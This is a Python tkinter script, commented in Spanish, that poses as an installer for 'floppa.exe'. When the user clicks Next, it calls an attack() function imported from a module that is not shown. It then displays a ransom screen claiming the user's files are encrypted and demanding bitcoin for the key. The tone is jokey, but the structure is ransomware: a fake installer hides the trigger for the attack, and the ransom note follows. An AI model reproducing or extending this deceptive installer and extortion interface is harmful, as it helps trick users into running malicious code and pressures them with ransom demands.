import tkinter as tk
from tkinter import ttk, messagebox
from PIL import Image, ImageTk, ImageSequence
import os  # Importa el módulo os para manejar rutas de archivos
from floppa import *  # Importa tu módulo floppa que contiene las funciones

class InstallerApp(tk.Tk):
    def __init__(self):
        super().__init__()

        self.title("Floppa installer")
        self.geometry("800x600")
        
        self.step = 0
        self.steps = [
            ("Bienvenido", self.welcome_step),
            ("¡Tus archivos han sido encriptados por floppa.exe!", self.ransom_step)
        ]
        
        self.create_widgets()

        # Obtén la ruta del directorio donde se encuentra el script actual
        self.script_directory = os.path.dirname(os.path.abspath(__file__))
        
        # Ruta al archivo GIF
        self.gif_path = os.path.join(self.script_directory, "hecker.gif")

    def create_widgets(self):
        self.header_label = ttk.Label(self, text="Bienvenido al Instalador", font=("Helvetica", 16))
        self.header_label.pack(pady=20)
        
        self.content_frame = ttk.Frame(self)
        self.content_frame.pack(expand=True, fill=tk.BOTH)
        
        self.button_frame = ttk.Frame(self)
        self.button_frame.pack(fill=tk.X)
        
        self.back_button = ttk.Button(self.button_frame, text="Atrás", command=self.prev_step, state=tk.DISABLED)
        self.back_button.pack(side=tk.LEFT, padx=5, pady=5)
        
        self.next_button = ttk.Button(self.button_frame, text="Siguiente", command=self.next_step)
        self.next_button.pack(side=tk.RIGHT, padx=5, pady=5)
        
        self.steps[self.step][1]()

    def clear_content(self):
        for widget in self.content_frame.winfo_children():
            widget.destroy()
    
    def welcome_step(self):
        self.clear_content()
        ttk.Label(self.content_frame, text="Bienvenido al instalador. Haga clic en 'Siguiente' para continuar con la instalación de floppa.exe").pack(pady=10)
    
    def animate_gif(self, frame_index):
        frame = self.gif_frames[frame_index]
        self.gif_label.configure(image=frame)
        self.after(100, self.animate_gif, (frame_index + 1) % len(self.gif_frames))

    def ransom_step(self):
        self.clear_content()
        ttk.Label(self.content_frame, text="Necesitas pagar al menos 500000 bitcoins para recuperar tus archivos muajajajja. Debes pagarnos y te daremos la clave.").pack(pady=10)
        
        # Carga y muestra el GIF
        self.gif = Image.open(self.gif_path)
        self.gif_frames = [ImageTk.PhotoImage(frame.copy().convert("RGBA")) for frame in ImageSequence.Iterator(self.gif)]
        self.gif_label = ttk.Label(self.content_frame)
        self.gif_label.pack(pady=10)
        
        self.animate_gif(0)
        self.next_button.config(text="Pagar", command=self.quit)
    
    def prev_step(self):
        if self.step > 0:
            self.step -= 1
            self.steps[self.step][1]()
            self.header_label.config(text=self.steps[self.step][0])
        if self.step == 0:
            self.back_button.config(state=tk.DISABLED)
        self.next_button.config(text="Siguiente", command=self.next_step)
    
    def next_step(self):
        if self.step < len(self.steps) - 1:
            self.step += 1
            self.steps[self.step][1]()
            self.header_label.config(text=self.steps[self.step][0])
            attack()  # Llama a la función attack() al avanzar a la siguiente etapa
        if self.step > 0:
            self.back_button.config(state=tk.NORMAL)
        if self.step == len(self.steps) - 1:
            self.back_button.config(state=tk.DISABLED)
            self.next_button.config(text="Pagar", command=self.quit)

if __name__ == "__main__":
    app = InstallerApp()
    app.mainloop()